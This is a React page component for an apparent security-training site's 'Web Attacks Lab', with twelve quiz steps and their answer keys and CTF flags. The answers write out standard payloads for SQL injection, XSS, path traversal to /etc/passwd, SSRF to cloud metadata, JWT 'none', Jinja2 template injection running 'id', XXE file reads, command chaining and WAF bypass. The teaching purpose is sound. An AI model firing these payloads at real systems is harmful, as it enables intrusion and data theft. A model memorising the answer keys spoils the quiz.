'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#00d4ff'
const moduleId = 'web-attacks'
const moduleName = 'Web Attacks'
const moduleNum = '06'

const steps: LabStep[] = [

  {
    id: 'web-01',
    title: 'Web Application Fingerprinting',
    objective: `Before testing a web app you identify its tech stack - this tells you which vulnerabilities to prioritise.`,
    hint: 'WhatWeb has an aggression level flag. -a 3 is aggressive mode.',
    answers: ['whatweb -a 3', 'whatweb --aggression 3', 'whatweb -a3', 'whatweb'],
    xp: 15,
    explanation: `whatweb -a 3 http://target.com`
  },

  {
    id: 'web-02',
    title: 'Burp Suite - Intercepting and Modifying Requests',
    objective: `You are intercepting a login POST request. You want to send this request to the Repeater tool. What keyboard shortcut sends the current intercepted request to Repeater?`,
    hint: 'The Repeater shortcut in Burp Suite is Ctrl+R.',
    answers: ['ctrl+r', 'ctrl r', 'Ctrl+R', 'send to repeater'],
    xp: 15,
    explanation: `Burp Suite core workflow: Proxy -> Intercept -> Modify -> Forward (Ctrl+F)`
  },

  {
    id: 'web-03',
    title: 'SQL Injection - Types and Detection',
    objective: `You are testing a web application's search endpoint. You then test for time-based blind SQLi. What MySQL function causes a sleep delay?`,
    hint: 'MySQL has a SLEEP() function.',
    answers: ['sleep(5)', 'SLEEP(5)', '1 AND SLEEP(5)--'],
    xp: 20,
    explanation: `Blind Time-based SQLi: MySQL: ' AND SLEEP(5)--`
  },

  {
    id: 'web-04',
    title: 'Cross-Site Scripting (XSS)',
    objective: `A WAF is blocking the classic script alert payload. What is a common alternative XSS vector using an image tag?`,
    hint: 'Use an img tag with a broken src and onerror=alert(1).',
    answers: ['<img src=x onerror=alert(1)>'],
    flag: 'FLAG{xss_bypassed}',
    xp: 20,
    explanation: `Common XSS bypass: <img src=x onerror=alert(1)>`
  },

  {
    id: 'web-05',
    title: 'Local File Inclusion (LFI)',
    objective: `What payload would attempt to read /etc/passwd using directory traversal?`,
    hint: 'Use ../ to traverse up directories.',
    answers: ['../../../../etc/passwd'],
    xp: 20,
    explanation: `LFI payload: ../../../../etc/passwd`
  },

  {
    id: 'web-06',
    title: 'Server-Side Request Forgery (SSRF)',
    objective: `What URL would you try to access the AWS EC2 instance metadata service?`,
    hint: 'The AWS metadata service is at 169.254.169.254',
    answers: ['http://169.254.169.254'],
    flag: 'FLAG{ssrf_cloud_pwned}',
    xp: 20,
    explanation: `AWS metadata: http://169.254.169.254/latest/meta-data/`
  },

  {
    id: 'web-07',
    title: 'Broken Authentication - JWT Attacks',
    objective: `A classic JWT attack changes the algorithm to "none". What do you change the "alg" field to?`,
    hint: 'The algorithm value for no signature is "none".',
    answers: ['none'],
    xp: 20,
    explanation: `JWT none attack: change alg to "none"`
  },

  {
    id: 'web-08',
    title: 'Insecure Direct Object Reference (IDOR)',
    objective: `What HTTP status code would you expect from the original /profile?id=1042 endpoint when accessing your own profile?`,
    hint: 'A successful HTTP response returns status code 200.',
    answers: ['200'],
    flag: 'FLAG{idor_found}',
    xp: 15,
    explanation: `IDOR: changing ID parameter to access another user's data`
  },

  {
    id: 'web-09',
    title: 'Server-Side Template Injection (SSTI)',
    objective: `What Jinja2 SSTI payload would execute the system command "id"?`,
    hint: 'Use Python class traversal to reach os.popen.',
    answers: ['{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'],
    xp: 20,
    explanation: `Jinja2 RCE: {{config.__class__.__init__.__globals__["os"].popen("id").read()}}`
  },

  {
    id: 'web-10',
    title: 'XML External Entity (XXE) Injection',
    objective: `What DOCTYPE declaration defines an external entity "xxe" that reads /etc/passwd?`,
    hint: 'XXE DOCTYPE syntax uses SYSTEM "file:///etc/passwd"',
    answers: ['<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'],
    flag: 'FLAG{xxe_executed}',
    xp: 20,
    explanation: `XXE payload reads local files via external entity`
  },

  {
    id: 'web-11',
    title: 'Command Injection',
    objective: `What character allows you to chain a second command after the ping command in Linux?`,
    hint: 'The semicolon ; runs the second command regardless of the first.',
    answers: [';', '&&', '|'],
    xp: 20,
    explanation: `Command chaining: ping google.com; id`
  },

  {
    id: 'web-12',
    title: 'WAF Bypass Techniques',
    objective: `What SQL injection bypass technique uses comment syntax to break up blocked keywords?`,
    hint: 'SQL comments /**/ can be inserted inside keywords.',
    answers: ['UN/**/ION', 'UNION/**/SELECT'],
    flag: 'FLAG{waf_bypassed}',
    xp: 20,
    explanation: `WAF bypass: UN/**/ION SE/**/LECT`
  },

]

export default function WebAttacksLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#004a5a' }}>
        <Link href="/" style={{ color: '#004a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/web-attacks" style={{ color: '#004a5a', textDecoration: 'none' }}>WEB ATTACKS</Link>
        <span>›</span>
        <span style={{ color: accent }}>LAB</span>
      </div>

      <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', color: accent }}>Web Attacks Lab</h1>

      <LabTerminal
        labId="web-attacks-lab"
        moduleId={moduleId}
        title="Web Attacks Lab"
        accent={accent}
        steps={steps}
        onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
      />

      {guidedDone && (
        <div style={{ marginTop: '3rem' }}>
          <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} />
        </div>
      )}

      <div style={{ marginTop: '3rem' }}>
        <Link href="/modules/web-attacks" style={{ color: '#2a6a7a' }}>← Back to Concept</Link>
      </div>
    </div>
  )
}
